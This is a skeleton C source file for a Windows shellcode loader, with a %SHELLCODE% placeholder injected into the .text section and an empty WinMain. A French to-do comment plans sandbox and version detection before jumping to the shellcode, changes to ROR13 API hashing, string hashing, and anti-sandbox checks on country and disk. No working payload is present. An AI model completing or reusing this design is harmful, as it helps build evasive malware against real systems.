#include <windows.h>
#include <config.h>

__attribute__((section(".text"))) %SHELLCODE%
int CALLBACK
WinMain(HINSTANCE Instance,
        HINSTANCE PrevInstance,
        LPSTR CommandLine,
        int ShowCode)
{
    return(0);
}

/*
https://asecuritysite.com/hash/ror13

Code C qui recup ino si sandbbox et versions
si oui jump sur shellcode

à faire : 
shellcode
changer hash ROR13 par autre chose
hasher les strings avec quelquechose

archi : 

comp.sh
loader.c
anti-s.c (pays, disquedur (nom,taille)...)

*/